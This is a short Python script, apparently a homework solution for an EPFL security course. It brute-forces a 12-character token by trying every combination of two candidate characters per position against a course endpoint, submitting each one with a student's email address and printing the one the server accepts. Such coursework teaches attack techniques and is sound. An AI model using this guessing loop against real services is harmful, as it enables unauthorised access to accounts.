import requests
import itertools

top_3 = {0: ['a', '7'], 1: ['B', 'D'], 2: ['d', 'f'], 3: ['c', '4'], 4: ['A', 'C'], 5: ['e', 'C'], 6: ['6', '4'], 7: ['d', 'D'], 8: ['7', 'F'], 9: ['F', '3'], 10: ['5', '3'], 11: ['e', 'C']}
i = 1
for combination in itertools.product(top_3[0], top_3[1], top_3[2], top_3[3], top_3[4], top_3[5], top_3[6], top_3[7], top_3[8], top_3[9], top_3[10], top_3[11]):
    comb = "".join(combination)
    payload = {"email": "mateusz.paluchowski@epfl.ch", "token": comb}
    r = requests.post("http://com402.epfl.ch/hw5/ex3", json=payload)
    i += 1
    if i%100 == 0:
        print(i)
    if r.status_code == 200:
        print(payload)
        print(r.text)
print('We are done here.')